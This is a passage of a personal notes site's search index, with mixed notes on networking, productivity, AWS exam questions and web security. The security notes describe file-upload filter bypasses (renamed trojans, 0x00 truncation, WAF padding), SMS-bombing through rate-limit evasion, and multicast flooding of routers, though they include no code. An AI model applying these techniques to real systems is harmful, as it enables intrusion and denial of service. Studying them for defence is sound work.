\u0026#x21a9;\u0026#xfe0e;\n   ","id":46,"section":"notes","summary":"Startup Points on MacOS There are several locations that can be registered by applications for automatically launching when the system boot up:\nApplication related:\n System Preferences -\u0026gt; Users \u0026amp; Groups -\u0026gt; Login Items 1 /Library/StartUpItems 1 2 /Library/LaunchDaemons 1 2 /Library/LaunchAgents 1 2 /Users/username/Library/LaunchAgents 2  System related:\n /System/Library/LaunchDaemons 1 2 /System/Library/LaunchAgents 1 2 /System/Library/StartupItems 2  Some applications may register themselves as system related services, especially those working stealthy.","tags":["MacOS","macos","Auto","Start","auto","start"],"title":"","uri":"https://kenmlai.me/notes/201910241203/","year":"2019"},{"content":"Devonthink Workflow we can use databases to store documents with very specific purposes1. I categorize them as following:\n Inboxes: input of all new documents References: webpage scraped, books, PDFs, videos and etc. that are read and noted Stalled: documents for reference in case, probably will never be changed. like enroll form, certificates and etc. Projects: All files related to projects.  For things that is currently working on, we can make a separate folder/database which replicate all documents from somewhere else[@DE744171C157]. The files in the folder is dynamic and periodically checked and cleaned up.\n  [[DEVONthink — Second Impression and some Tips | ORGANIZING CREATIVITY]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":47,"section":"notes","summary":"Devonthink Workflow we can use databases to store documents with very specific purposes1. I categorize them as following:\n Inboxes: input of all new documents References: webpage scraped, books, PDFs, videos and etc. that are read and noted Stalled: documents for reference in case, probably will never be changed. like enroll form, certificates and etc. Projects: All files related to projects.  For things that is currently working on, we can make a separate folder/database which replicate all documents from somewhere else[@DE744171C157].","tags":["Mac","Productivity","productivity","mac","DevonThink","devonthink"],"title":"","uri":"https://kenmlai.me/notes/201910241725/","year":"2019"},{"content":"用FFMPEG录制RTSP RTSP的URL地址格式是：\nrtsp://$(IP):$(PORT)/user=$(USER)\u0026amp;password=$(PWD)\u0026amp;channel=$(Channel)\u0026amp;stream=$(Stream).sdp?real_stream  在确认能够收到流之后（如使用VLC），可以使用FFMPEG来录制流1\napt install FFmpeg -y RTSP=\u0026quot;rtsp://127.0.0.1:554/user=user\u0026amp;password=password\u0026amp;channel=Channel\u0026amp;stream=Stream.sdp?real_stream\u0026quot; ffmpeg -rtsp_transport tcp -i $RTSP -vcodec copy -r 1 -t 60 -y $(TZ=UTC-8 date +\\%m\\%d\\%H\\%M).mp4  上面的命令每次录制1分钟，以时间为文件名来保存。然后即可用cron来每分钟自动运行\n  [[使用 FFmpeg 远程读取 rtsp 监控视频流 - 木子]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":48,"section":"notes","summary":"用FFMPEG录制RTSP RTSP的URL地址格式是： rtsp://$(IP):$(PORT)/user=$(USER)\u0026amp;password=$(PWD)\u0026amp;channel=$(Channel)\u0026amp;stream=$(Stream).sdp?real_stream 在确认能够收到流之后（如使用VLC），可以使用FFMPEG来录制流1 apt install FFmpeg -y RTSP=\u0026quot;rtsp://127.0.0.1:554/user=user\u0026amp;password=password\u0026amp;channel=Channel\u0026amp;stream=Stream.sdp?real_stream\u0026quot; ffmpeg -rtsp_transport tcp","tags":["Linux","RTSP","FFMPEG"],"title":"","uri":"https://kenmlai.me/notes/201910231133/","year":"2019"},{"content":"Resilient Design Vendors are so keen to push more products by providing immature design that is perfect in PPT only.1\nI always admire and respect Netflix\u0026rsquo;s ChaosMonkey, which randomly shuts down services everyday to test its design. It exposes flaws in design early and make components more independent in a system.\n  [[Disaster Recovery Faking, Take Two « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":49,"section":"notes","summary":"Resilient Design Vendors are so keen to push more products by providing immature design that is perfect in PPT only.1\nI always admire and respect Netflix\u0026rsquo;s ChaosMonkey, which randomly shuts down services everyday to test its design. It exposes flaws in design early and make components more independent in a system.\n  [[Disaster Recovery Faking, Take Two « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Networking","Design","Architecture"],"title":"","uri":"https://kenmlai.me/notes/201910231207/","year":"2019"},{"content":"Split String into Array in AppleScript we can use the words command in AppleScript to split a string into an array:1\nset items to words of a_string  there\u0026rsquo;s a drawback that we can\u0026rsquo;t set the delimiter of splitting.2\n  [[Split a string into multiple variables AppleScript - Stack Overflow]] \u0026#x21a9;\u0026#xfe0e;\n [[Beginning AppleScript® - 5.6. Words, Characters, and Paragraphs]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":50,"section":"notes","summary":"Split String into Array in AppleScript we can use the words command in AppleScript to split a string into an array:1\nset items to words of a_string  there\u0026rsquo;s a drawback that we can\u0026rsquo;t set the delimiter of splitting.2\n  [[Split a string into multiple variables AppleScript - Stack Overflow]] \u0026#x21a9;\u0026#xfe0e;\n [[Beginning AppleScript® - 5.6. Words, Characters, and Paragraphs]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Mac","Programming","programming","mac","AppleScript","String","Array","List","applescript","string","array","list"],"title":"","uri":"https://kenmlai.me/notes/201910212118/","year":"2019"},{"content":"SQL Injection  如果网页提交之后URL没有刷新，可以初步判断是POST类型 1 可以使用密码123456来进行测试，其base64编码是MTIzNDU2 1 可以在浏览器的开发者工具中将textbox的类型从password改成text，这样密码会以明文显示。 1    [[SQL注入初试小刀 | F4n9X\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":51,"section":"notes","summary":"SQL Injection 如果网页提交之后URL没有刷新，可以初步判断是POST类型 1 可以使用密码123456来进行测试，其base64编码是MTIzNDU2 1 可","tags":["Cyber","Security","RedTeam","SQLInjection"],"title":"","uri":"https://kenmlai.me/notes/201910201702/","year":"2019"},{"content":"File Uploading Vulnerability how uploading files get verified There are three parts that can verify uploading files 1:\n client side by using JSP, which usually examine extension name only server side, which normally includes content-type in header, file content header check (GIF89a), extension blacklist, extension whitelist, and customized rules. WAF, this depends on policies applied and vendor specific  Bypass verification client side capture and modify packets to bypass. For example, we can rename a asp/php/jsp trojan to jpg/gif file to bypass the client side verification, and use burpsuite to capture and modify the extension back to upload it.1\nserver side file type capture and modify the content-type 12\nfile header capture and add file header 1\nextension blacklist \u0026amp; whitelist  upload a file, whose extension is not blacklisted, with malicious content. Then use a second file to include the first file for execution.1 upload invalid filename on certain OS (like Windows), in which invalid part is automatically truncated; for linux, change extension to upper is a try 1 0x00 truncate. characters behind 0x00 in filename or path will be automatically ignored  WAF  prepend junk data. some WAF only check a certain amount data for each packet WAF security vulnerabilities.  Security Suggestions  use extension whitelist on server side check file content on server side rename uploaded files hide uploaded file path    [[文件上传漏洞（绕过姿势） | nmask\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n [[记一次绕过后缀名限制的文件上传 | nmask\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":52,"section":"notes","summary":"File Uploading Vulnerability how uploading files get verified There are three parts that can verify uploading files 1: client side by using JSP, which usually examine extension name only server side, which normally includes content-type in header, file content header check (GIF89a), extension blacklist, extension whitelist, and customized rules. WAF, this depends on policies applied and vendor specific Bypass verification client side capture and modify packets to bypass. For example,","tags":["cybersecurity","Cyber","Security","RedTeam"],"title":"","uri":"https://kenmlai.me/notes/201910201719/","year":"2019"},{"content":"201910201817 Put element in center Two most common ways of putting an element in center of its container (vertically and horizontally):[^0498E5372927]\n   .container { position: relative; width: 300px; height: 200px; border: 1px solid #333333; } .content { background-color: #ccc; position: absolute; top: 50%; left: 50%; transform: translate3d(-50%, -50%, 0); text-align: center; }    .container { width: 300px; height: 200px; border: 1px solid #333333; display: flex; align-items: center; justify-content: center; } .content { background-color: #ccc; text-align: center; }  P.S. 实际测试中，方法2的justify-content: center可以不写。不知道这句是不是为了兼容性添加的\n","id":53,"section":"notes","summary":"201910201817 Put element in center Two most common ways of putting an element in center of its container (vertically and horizontally):[^0498E5372927] .container { position: relative; width: 300px; height: 200px; border: 1px solid #333333; } .content { background-color: #ccc; position: absolute; top: 50%; left: 50%; transform: translate3d(-50%, -50%, 0); text-align: center; } .container { width: 300px; height: 200px; border: 1px solid #333333; display: flex; align-items: center; justify-content: center; } .content {","tags":["Design","CSS","Web"],"title":"","uri":"https://kenmlai.me/notes/201910201817/","year":"2019"},{"content":"201910191200 Spam through verification messages Attackers can use account verification services to spam a client even an interval is set for the same account.1\n Web page validation can be evaded by using POST method directly Backend validation for the interval can be detoured by pre-pending/appending meaningless characters to the same account, like, spaces, 0x00.    [[记一次利用00进行短信轰炸的渗透手法 | nmask\u0026rsquo;s Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":54,"section":"notes","summary":"201910191200 Spam through verification messages Attackers can use account verification services to spam a client even an interval is set for the same account.1 Web page validation can be evaded by using POST method directly Backend validation for the interval can be detoured by pre-pending/appending meaningless characters to the same account, like, spaces, 0x00. [[记一次利用00进行短信轰炸的","tags":["security","redteam","cybersecurity","Security","RedTeam","Spam","DoS","spam","dos"],"title":"","uri":"https://kenmlai.me/notes/201910191200/","year":"2019"},{"content":"Python Tips Export requirements.txt to poetry1 cat requirements.txt | perl -pe 's/([\u0026lt;=\u0026gt;]+)/:$1/g' | xargs -n 1 echo poetry add  How to Improve coding skills [[201911111639]]\n  https://github.com/sdispater/poetry/issues/663 \u0026#x21a9;\u0026#xfe0e;\n   ","id":55,"section":"notes","summary":"Python Tips Export requirements.txt to poetry1 cat requirements.txt | perl -pe 's/([\u0026lt;=\u0026gt;]+)/:$1/g' | xargs -n 1 echo poetry add  How to Improve coding skills [[201911111639]]\n  https://github.com/sdispater/poetry/issues/663 \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["python","Tips","tips","Python","poetry","poetry"],"title":"","uri":"https://kenmlai.me/notes/201910171302/","year":"2019"},{"content":"weight loss diet recipe shopping reference: [[201910160102]]\n鸡胸肉西兰花米饭  鸡胸肉\t~250g 西兰花\t~100g 米饭\t~50g   鸡胸肉切片加胡椒 锅加热喷油 鸡胸肉煎至金黄色 西兰花切块洗净 沸水加热煮西兰花，视喜好定加热时间  罗非鱼芦笋加红薯  罗非鱼\t~200g 芦笋\t5-6根 红薯\t1个 ~200g   罗非鱼煎熟 芦笋热水煮熟 红薯切厚片，热水煮熟  鸡肉沙拉三明治  软吐司 ~两片 水果\t~牛油果半个或类似 鸡肉/火鸡肉  蘑菇蔬菜鸡蛋卷  鸡蛋\t3个 蘑菇\t~7小个 切片 蔬菜\t如菠菜一小把   热锅喷油 下蘑菇加胡椒 蘑菇热后下菠菜  吞拿鱼罐头沙拉  吞拿鱼\t1小罐 蔬菜沙拉\t1袋  ","id":56,"section":"notes","summary":"weight loss diet recipe shopping reference: [[201910160102]] 鸡胸肉西兰花米饭 鸡胸肉 ~250g 西兰花 ~100g 米饭 ~50g 鸡胸肉切片加胡椒 锅加热喷油 鸡胸肉煎至金黄色 西兰花切块洗净 沸水加热煮西兰花，视喜好定加热时","tags":["weightloss","diet","recipe"],"title":"","uri":"https://kenmlai.me/notes/201910160039/","year":"2019"},{"content":"Shopping list for diet Woolworths Hass Avocado each\t$2/each Avocado The Odd Bunch 1kg punnet $6/1kg\nPrimo Turkey Breast 80g $3.25/each $5.50/two Primo Chicken Breast Thinly Sliced 80g $3.25/each $5.50/two\nany tuna fish can in spring water\t$2.3/each\n","id":57,"section":"notes","summary":"Shopping list for diet Woolworths Hass Avocado each\t$2/each Avocado The Odd Bunch 1kg punnet $6/1kg\nPrimo Turkey Breast 80g $3.25/each $5.50/two Primo Chicken Breast Thinly Sliced 80g $3.25/each $5.50/two\nany tuna fish can in spring water\t$2.3/each","tags":["weightloss","diet","shopping"],"title":"","uri":"https://kenmlai.me/notes/201910160102/","year":"2019"},{"content":"BGP study notes Characteristics:\n use TCP 179 port use triggered update periodically sends keepalive abundant metric for path selection  Timer:\n keeplive: 60 timeout: 180  BGP Synchronization:\n routes learnt from IBGP will be advertizd to ebgp neighbors only they are in the IGP too  Attribute:\n well-known mandatory（公认必尊，必须看到，必须传递）: as-path, next-hop, origin well-known discretionary（公认自觉，必须看到，可以不传递）: local-preference, atomic_aggregate Optional transitive: Community, Aggregator Optional non-transitive: MED, Originator_ID, Cluster_list, weight  Community attribute:\n  public attributes:\n no_advertise: don’t send to any bgp peer no_export: don’t send to any ebgp peer internet: send to all bgp peer local-as: don’t send to other AS peers    private: format in aa:nn\n  Path selection:\n weight local-preference (routes from local first) as-path origin: IGP \u0026gt; EGP \u0026gt; Incomplete MED (smaller is better) EBGP (AD 20) first \u0026gt; IBGP (AD 200) next-hop has smaller metric in IGP local balancing oldest EBGP route Router ID (smaller is better) \u0026lt;— usually stop here at a symmetric network cluster-id (shortest first) IP address (smaller is better)  aggreation:\n summary-only: suppress detail routes, only summarized route will be sent (at least one detail route in the summarized route exists, or nothing will be sent)  packets:\n open packets  create connections sender\u0026rsquo;s AS identifier capabilities   keepalive packets  maintain neighborhood   update  path information and metrics   notification. route-refresh.  tables:\n neighbor table. show ip bgp summary forwarding table. show ip bgp route table. show ip route  state machine:\n Idle. search route for neighbors Connect. handshaking. authentication is done during this state active. a router send open packet and wait for response Open sent. send Open packet. Open confirm. received open packet and matched. send keepalive and wait for the open confirm from the other end. Established. both side confirmed  troubleshooting:\n stuck in Idle: no route to the neighbor stuck in active: a router send open packet and wait for response. the state may swing between Idle and active, this may be because:  the neighbor doesn\u0026rsquo;t have the route for response (the neighbor will be in the idle state) neighbor configed wrong IP AS doesn\u0026rsquo;t match the neighbor doesn\u0026rsquo;t have a neighbor statement for this router (the neighbor will be in the idle state)    ","id":58,"section":"notes","summary":"BGP study notes Characteristics: use TCP 179 port use triggered update periodically sends keepalive abundant metric for path selection Timer: keeplive: 60 timeout: 180 BGP Synchronization: routes learnt from IBGP will be advertizd to ebgp neighbors only they are in the IGP too Attribute: well-known mandatory（公认必尊，必须看到，必须传递）","tags":["Networking","BGP"],"title":"","uri":"https://kenmlai.me/notes/201910141647/","year":"2019"},{"content":"Network Threats As listed by IANA, 224.0.0.0/24 is a reserved multicast range1. Since all host should listen to 224.0.0.1 and all routers should listen to 224.0.0.2 according the list, sending a huge volume of multicast to this range will kill network devices by overwhelming their CPU, which is designed to process the multicast traffic and won\u0026rsquo;t be protected by CoPP.2\n  IANA list \u0026#x21a9;\u0026#xfe0e;\n [[VMware NSX Killed My EVPN Fabric « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":59,"section":"notes","summary":"Network Threats As listed by IANA, 224.0.0.0/24 is a reserved multicast range1. Since all host should listen to 224.0.0.1 and all routers should listen to 224.0.0.2 according the list, sending a huge volume of multicast to this range will kill network devices by overwhelming their CPU, which is designed to process the multicast traffic and won\u0026rsquo;t be protected by CoPP.2\n  IANA list \u0026#x21a9;\u0026#xfe0e;\n [[VMware NSX Killed My EVPN Fabric « ipSpace.","tags":["Cyber","Security","Threats"],"title":"","uri":"https://kenmlai.me/notes/201910101123/","year":"2019"},{"content":"GTD method Collect  不用区分生活与工作事物1 pp.14。GTD的本质是解决如何有效的安排事物，把所有事物和在一起可以对所有眼前的事务有完整的大局观，而各种事务可以通过“标签”或者“上下文”来进行区分。 管理好所有工作的核心在于：清空、判断和回顾1 pp. 22-23：  清空在于让自己可以专注于某一事物而不被分心，而关键点在于100%捕获一切代办事宜1 pp.35和想法。如果无法被清空，则是还没有确定预期结果，或者没有确定下一步行动，亦或者还有相2关的资料没有进行关联，1 pp.22, 25。而“清空”并不代表完成，只是完成了任务的基本分类1 pp.165。 判断和核心在于理解工作的目的和目标1 pp. 23，永远选择最佳方案。如果目标不明，则会造成额外的压力1 pp. 22。没有目标的投入时间是一种狂热行为1 pp.74。只有极少情况是因为缺少时间而行动受阻，而往往是没有清晰的目标和方案1 pp.29。这个预期通常没有正确的答案，而是不同的选择1 pp.24。而一个行动必须是实际可行的1 pp.141，即有明确的目标且可以达到。 回顾则侧重于重新审视是否外界情况、目标和方法等有了变化，以便作出调整。1 pp.57   Stuff是任何没有明确理解或者目标，以及没有可执行下一步的事务1 pp.27。而GTD则需要将Stuff转化为可执行的事务。  Organize 横向管理让我们的工作前后具有逻辑性和连贯性，而纵向管理则关注与每个具体主题中相关的事务1 pp. 30-31。比如做旅行计划时，先做什么，后做什么是横向管理；而每个事务的具体内容，比如每个景点大概要看什么，机票时间，酒店位置之类内容则属于纵向管理的范围。 横向管理的5个阶段1 pp. 34。收集、确定目标和解决方法、组织、制作行动方案和行动。 应该最大限度减少收集设备的数量，而且定期清空1 pp. 40。GTD的主旨在于清空大脑，让人可以专注于一项工作。过多的输入设备（比如，纸质笔记本、ipad、iphone以及其他智能设备）会导致在收集以及整理的时候工作量大增。如果不能有效的把一闪而过的想法记录下来，那么就无法信任GTD系统的可靠性。 当有一个新的事务要处理时，首先判断是否可以在两分钟内完成1 pp. 45-46。这里的关键词是“完成”，而并不是开始行动。实际上很多事务都无法在两分钟内完成。而对于那些两分钟内无法完成的事务，则需要委派或者记录下来自己完成。 当前无法操作却又不想忘记的事情，可以放到“将来/也许”一类1 pp.53。这一点有可以通过zettlekasten来完成，从记录零散想法的角度来看，这样也许更好。 对于可以暂时忘记的事情，可以把相关资料存入“备忘录”，然后设定在指定的时间来回顾1 pp.54。 事务可以分为两类：必须在某一事件发生；尽快办理，越早越好1 pp.51。第一类事情因被安排进日程表，第二类则进入GTD系统。 纵向管理可以通过 1)结合目标和已有经验的方式进行自然式计划1 pp67-70。这类计划通常有比较明确的目标，可以通过常识和逻辑分析出相关的内容，再加以处理制定出计划；2) 反应式计划。通常没有特别明确的目标和前期计划，一切随机应变1 pp.70-73。  Act 应变式计划要求灵活的思维，1) 不判断，不质疑，不评估，不批判；2) 追求数量，不求质量；3)分析组织想法的工作放在没有更多新点子之后再来进行1 pp.85。这种方式类似于头脑风暴。 处理事务的基本原子是：1)从最上面开始；2)一次只处理一件事；3)永远不把任何事情放回列表。1 pp.134 除了“地点”、“时间”和“重要性”这三个选择因素外，“精力”是选择下一步行动的先觉条件。可以在疲劳的时候处理一些简单任务1 pp.204，比如“看漫画”。 应当优先处理已经明确安排的工作，新任务按照Collect中的方法进行收集或立即处理1 pp.206。  Review 回顾(Review)需要可以定期或者不定期的进行1 pp.192-193, [[201910041540]]。因为每天会接收大量的内容，全部收集在GTD系统中之后，需要花时间来确定什么任务是最有价值完成的。周期性的回顾应单独预留一定的时间（如每周两小时1 pp.198）并站在更高的角度来完成1 pp.197。 对于不再感兴趣或者不再有价值的事项，应从系统中删除1 pp.196。    [[尽管去做——无压工作的艺术]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":60,"section":"notes","summary":"GTD method Collect 不用区分生活与工作事物1 pp.14。GTD的本质是解决如何有效的安排事物，把所有事物和在一起可以对所有眼前的事务有完整的大局观，而各种","tags":["Productivity","GTD","gtd","productivity","methodology","workflow","methodology","workflow"],"title":"","uri":"https://kenmlai.me/notes/201910091125/","year":"2019"},{"content":"The Essenes of Redundancy The ultimate purpose of redundancy is to improve the weakest link in a system to the least acceptable standard1. A system\u0026rsquo;s reliability depends on the reliability of its weakest link.\n  [[Redundant BGP Connectivity on a Single ISP Connection « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":61,"section":"notes","summary":"The Essenes of Redundancy The ultimate purpose of redundancy is to improve the weakest link in a system to the least acceptable standard1. A system\u0026rsquo;s reliability depends on the reliability of its weakest link.\n  [[Redundant BGP Connectivity on a Single ISP Connection « ipSpace.net blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","tags":["Networking","Redundancy"],"title":"","uri":"https://kenmlai.me/notes/201910081342/","year":"2019"},{"content":"High Availability There are some simple questions need to be answered for a HA solution:\n How do clients know which server is alive?1 How do servers register themselves as a part of the service? How do servers notify themselves as alive?1 How do clients choose the best server when there are instances available?1    [[Anycast DNS — Resilient Scalability for Critical Network Infrastructure Software, Part 1]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":62,"section":"notes","summary":"High Availability There are some simple questions need to be answered for a HA solution:\n How do clients know which server is alive?1 How do servers register themselves as a part of the service? How do servers notify themselves as alive?1 How do clients choose the best server when there are instances available?1    [[Anycast DNS — Resilient Scalability for Critical Network Infrastructure Software, Part 1]] \u0026#x21a9;\u0026#xfe0e;","tags":["Network","HighAvailability"],"title":"","uri":"https://kenmlai.me/notes/201910071331/","year":"2019"},{"content":"AWS Systems Manager Patch Manager Feature summary 1  Main Purpose: automates the process of patching instances Capability:  patch EC2, on-premises servers and VMs OS: Windows Servers, Ubuntu, RHEL, SUSE, CentOS, Amazon Linux and Amazon Linux 2 (All EC2 OS types) Apply individually or groups by using EC2 tags   Integrate with:  AWS Identity Access Management (IAM) Cloud Trail CloudWatch Events   Steps:  Verify Systems Manager prerequisites Setup and configure patching Configure permissions for Maintenance Windows (if this feature is used) Create patch baselines, patch groups, and a maintenance windows    Patch groups 2  A group can only be registered with one baseline Tag name MUST be: Patch Group One instance can only be in one patch group    [[AWS Systems Manager Patch Manager - AWS Systems Manager]] \u0026#x21a9;\u0026#xfe0e;\n [[About Patch Groups - AWS Systems Manager]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":63,"section":"notes","summary":"AWS Systems Manager Patch Manager Feature summary 1  Main Purpose: automates the process of patching instances Capability:  patch EC2, on-premises servers and VMs OS: Windows Servers, Ubuntu, RHEL, SUSE, CentOS, Amazon Linux and Amazon Linux 2 (All EC2 OS types) Apply individually or groups by using EC2 tags   Integrate with:  AWS Identity Access Management (IAM) Cloud Trail CloudWatch Events   Steps:  Verify Systems Manager prerequisites Setup and configure patching Configure permissions for Maintenance Windows (if this feature is used) Create patch baselines, patch groups, and a maintenance windows    Patch groups 2  A group can only be registered with one baseline Tag name MUST be: Patch Group One instance can only be in one patch group    [[AWS Systems Manager Patch Manager - AWS Systems Manager]] \u0026#x21a9;\u0026#xfe0e;","tags":["AWS","CloudWatch","PatchManager","SystemsManager","AWSIdentity","IAM","CloudTrail"],"title":"","uri":"https://kenmlai.me/notes/201910072014/","year":"2019"},{"content":"AWS DevOps Engineer Professional Exam Practices Q1 To run an application, a DevOps Engineer launches an Amazon EC2 instances with public IP addresses in a public subnet. A user data script obtains the application artifacts and installs them on the instances upon launch. A change to the security classification of the application now requires the instances to run with no access to the Internet. While the instances launch successfully and show as healthy, the application does not seem to be installed.\nWhich of the following should successfully install the application while complying with the new rule?\nA. Launch the instances in a public subnet with Elastic IP addresses attached. Once the application is installed and running, run a script to disassociate the Elastic IP addresses afterwards. B. Set up a NAT gateway. Deploy the EC2 instances to a private subnet. Update the private subnet\u0026rsquo;s route table to use the NAT gateway as the default route. C. Publish the application artifacts to an Amazon S3 bucket and create a VPC endpoint for S3. Assign an IAM instance profile to the EC2 instances so they can read the application artifacts from the S3 bucket. D. Create a security group for the application instances and whitelist only outbound traffic to the artifact repository. Remove the security group rule once the install is complete.\nAnswer: C\nExplanation: The question clearly requires the instances can not access the Internet, then A, B and D can be directly eliminated.\n","id":64,"section":"notes","summary":"AWS DevOps Engineer Professional Exam Practices Q1 To run an application, a DevOps Engineer launches an Amazon EC2 instances with public IP addresses in a public subnet. A user data script obtains the application artifacts and installs them on the instances upon launch. A change to the security classification of the application now requires the instances to run with no access to the Internet. While the instances launch successfully and show as healthy, the application does not seem to be installed.","tags":["AWS","Exam","DevOps"],"title":"","uri":"https://kenmlai.me/notes/201910072033/","year":"2019"},{"content":"AWS DevOps Engineer Professional Exam Practices Q2 An IT department manages a portfolio with Windows and Linux (Amazon and Red Hat Enterprise Linux) servers both on-premises and on AWS. An audit reveals that there is no process for updating OS and core application patches, and that the servers have inconsistent patch levels.\nWhich of the following provides the MOST reliable and consistent mechanism for updating and maintaining all servers at the recent OS and core application patch levels?\nA. Install AWS Systems Manager agent on all on-premises and AWS servers. Create Systems Manager Resource Groups. Use Systems Manager Patch Manager with a pre-configured patch baseline to run scheduled patch updates during maintenance windows. B. Install the AWS OpsWorks agent on all on-premises and AWS servers. Create an OpsWorks stack with separate layers for each operating system, and get a recipe from the Chef supermarket to run the patch commands for each layer during maintenance windows. C. Use a shell script to install the latest OS patches on the Linux servers using yum and schedule it to run automatically using cron. Use Windows Update to automatically patch Windows servers. D. Use AWS Systems Manager Parameter Store to securely store credentials for each Linux and Windows server. Create Systems Manager Resource Groups. Use the Systems Manager Run Command to remotely deploy patch updates using the credentials in Systems Manager Parameter Store\nAnswer: A\nExplanation: AWS provides a patching service call Patch Manager [[201910072014]]\n","id":65,"section":"notes","summary":"AWS DevOps Engineer Professional Exam Practices Q2 An IT department manages a portfolio with Windows and Linux (Amazon and Red Hat Enterprise Linux) servers both on-premises and on AWS. An audit reveals that there is no process for updating OS and core application patches, and that the servers have inconsistent patch levels.\nWhich of the following provides the MOST reliable and consistent mechanism for updating and maintaining all servers at the recent OS and core application patch levels?","tags":["AWS","Exam","DevOps","PatchManager"],"title":"","uri":"https://kenmlai.me/notes/201910072036/","year":"2019"},{"content":"AWS DevOps Engineer Professional Exam Practices Q3 A company is setting a centralised logging solution on AWS and has several requirements. The company wants its Amazon CloudWatch Logs and VPC Flow logs to come from different sub accounts and to be delivered to a single auditing account. However, the number of sub accounts keeps changing. The company also needs to index the logs in the auditing account to gather actionable insight.\nHow should a DevOps Engineer implement the solution to meet all of the company\u0026rsquo;s requirements?\nA. Use AWS Lambda to write logs to Amazon ES in the auditing account Create an Amazon CloudWatch subscription filter and use Amazon Kinesis Data Streams in the sub accounts to stream the logs to the Lambda function deployment in the auditing account. B. Use Amazon Kinesis Streams to write logs to Amazon ES in the auditing account. Create a CloudWatch subscription filter and use Kinesis Data Streams in the sub accounts to stream the logs to the Kinesis stream in the auditing account. C. Use Amazon Kinesis Firehose with Kinesis Data Streams to write logs to Amazon ES in the auditing account. Create a CloudWatch subscription filter and stream logs from sub accounts to the Kinesis stream in the auditing account. D. Use AWS Lambda to write logs to Amazon ES in the auditing account. Create a CloudWatch subscription filter and use Lambda in the sub accounts to stream the logs to the Lambda function deployed in the auditing account.\nAnswer: C\nExplanation: 1\n  [[Central Logging in Multi-Account Environments | AWS Architecture Blog]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":66,"section":"notes","summary":"AWS DevOps Engineer Professional Exam Practices Q3 A company is setting a centralised logging solution on AWS and has several requirements. The company wants its Amazon CloudWatch Logs and VPC Flow logs to come from different sub accounts and to be delivered to a single auditing account. However, the number of sub accounts keeps changing. The company also needs to index the logs in the auditing account to gather actionable insight.","tags":["AWS","Exam","DevOps","Firehose","Kinesis","CloudWatch"],"title":"","uri":"https://kenmlai.me/notes/201910072038/","year":"2019"},{"content":"AWS DevOps Engineer Professional Exam Practices Q4 A company wants to use a grid system for a proprietary enterprise in-memory data store on top of AWS. This system can run in multiple server nodes in any Linux-based distribution. The system must be able to reconfigure the entire cluster every time a node is added or removed. When adding or removing nodes, an /etc/cluster/nodes.config file must be updated, listing the IP addresses of the current node members of that cluster. The company wants to automate the task of adding new nodes to a cluster.\nWhat can a DevOps Engineer do to meet these requirements?\nA. Use AWS OpsWorks Stacks to layer the server nodes of that cluster. Create a Chef recipe that populates the content of the /etc/cluster/nodes.config file and restarts the service by using the current members of the layer. Assign that recipe to the Configure lifecycle event. B. Put the file nodes.config in version control. Create an AWS CodeDeploy deployment configuration and deployment group based on an Amazon EC2 tag value for the cluster nodes. When adding a new node to the cluster, update the file with all tagged instances, and make a commit in version control. Deploy the new file and restart the services. C. Create an Amazon S3 bucket and upload a version of the /etc/cluster/nodes.config file. Create a crontab script that will poll for that S3 file and download it frequently. Use a process manager, such as Monit or systemd, to restart the cluster services when it detects that the new file was modified. When adding a node to the cluster, edit the file\u0026rsquo;s most recent members. Upload the new file to the S3 bucket . D. Create a user data script that lists all members of the current security group of the cluster and automatically updates the /etc/cluster/nodes.config file whenever a new instance is added to the cluster\nAnswer:\nExplanation: C: The solution creates a racing condition when multiple instances go up simultaneously. It\u0026rsquo;s logically impractical. D: This doesn\u0026rsquo;t solve the issue when removing nodes\n","id":67,"section":"notes","summary":"AWS DevOps Engineer Professional Exam Practices Q4 A company wants to use a grid system for a proprietary enterprise in-memory data store on top of AWS. This system can run in multiple server nodes in any Linux-based distribution. The system must be able to reconfigure the entire cluster every time a node is added or removed. When adding or removing nodes, an /etc/cluster/nodes.config file must be updated, listing the IP addresses of the current node members of that cluster.","tags":["AWS","Exam","DevOps"],"title":"","uri":"https://kenmlai.me/notes/201910072049/","year":"2019"},{"content":"Side Project List A website that provides simulated exam for certification, it should support:  single- and multiple-choice unlimited number of choices images in question and answers randomise answers fix an answer in a set position (like, keep the \u0026ldquo;above all\u0026rdquo; as the last answer) answer checking comments\u0026rsquo; of the question left by students answer explanation  Video series of anti-virus/malware software  download sample virus \u0026amp; malware each software use default settings latest version \u0026amp; database 2 scenarios: 1) having internet connection; 2) don\u0026rsquo;t have internet connection. 1  english reading helper  parse a webpage to provide a cluster-less reading experience can mark english words as known or unknown, can tracking words statistics, like how many words have been read, appearance level per 1k words sentence reading difficulty measure recommend articles based on vocabulary level and reading difficulty    [[Lies, and Damn Lies: . Getting Past the Hype of Endpoint Security Solutions]] \u0026#x21a9;\u0026#xfe0e;\n   ","id":68,"section":"notes","summary":"Side Project List A website that provides simulated exam for certification, it should support:  single- and multiple-choice unlimited number of choices images in question and answers randomise answers fix an answer in a set position (like, keep the \u0026ldquo;above all\u0026rdquo; as the last answer) answer checking comments\u0026rsquo; of the question left by students answer explanation  Video series of anti-virus/malware software  download sample virus \u0026amp; malware each software use default settings latest version \u0026amp; database 2 scenarios: 1) having internet connection; 2) don\u0026rsquo;t have internet connection.","tags":["Idea","idea","SideProject","sideproject"],"title":"","uri":"https://kenmlai.me/notes/201910061559/","year":"2019"},{"content":"Practical principles of GTD  Actionable task. Anything that can\u0026rsquo;t be done under 2 minutes should be recorded 1 One step each time. A task is a single action and should be immutable2. This can be treated as one task in different status2 by using tags or similar ways. Focus on outcome. Describe the task as what I want to achieve in a brief and clear 